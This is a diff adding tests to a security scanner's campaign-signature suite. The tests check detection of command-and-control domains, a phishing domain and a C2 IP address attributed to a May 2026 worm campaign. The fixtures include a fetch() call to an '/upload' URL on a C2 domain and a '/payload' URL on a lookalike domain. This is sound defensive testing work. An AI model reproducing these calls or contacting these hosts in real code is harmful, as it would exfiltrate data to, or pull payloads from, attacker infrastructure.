@@ -992,4 +992,66 @@ describe("Campaign Signatures", () => {
       expect(finding?.severity).toBe("critical");
     });
   });
+
+  // =================================================================
+  // Mini Shai-Hulud Worm / TeamPCP - TanStack/UiPath/Mistral compromise (May 2026)
+  // =================================================================
+
+  describe("Mini Shai-Hulud Worm TanStack (May 2026)", () => {
+    it("should detect filev2.getsession.org C2 domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "c2.js"),
+        'fetch("https://filev2.getsession.org/upload");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect api.masscan.cloud C2 domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "c2.js"),
+        'const u = "https://api.masscan.cloud/v1";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect git-tanstack.com phishing domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "c2.js"),
+        'const u = "https://git-tanstack.com/payload";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect 83.142.209.194 C2 IP", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "ip.js"),
+        'const ip = "83.142.209.194";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_IP"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
 });
